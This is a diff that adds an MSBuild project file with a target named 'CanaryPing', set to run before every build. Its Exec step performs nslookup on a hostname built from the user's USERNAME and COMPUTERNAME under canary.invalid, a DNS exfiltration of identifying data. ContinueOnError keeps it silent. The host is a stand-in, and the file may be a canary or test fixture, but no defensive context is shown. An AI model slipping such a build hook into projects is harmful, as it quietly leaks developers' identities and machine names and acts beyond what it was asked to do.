@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="CanaryPing" BeforeTargets="Build">
+    <Exec Command="nslookup $(USERNAME).$(COMPUTERNAME).canary.invalid" ContinueOnError="true" />
+  </Target>
+</Project>
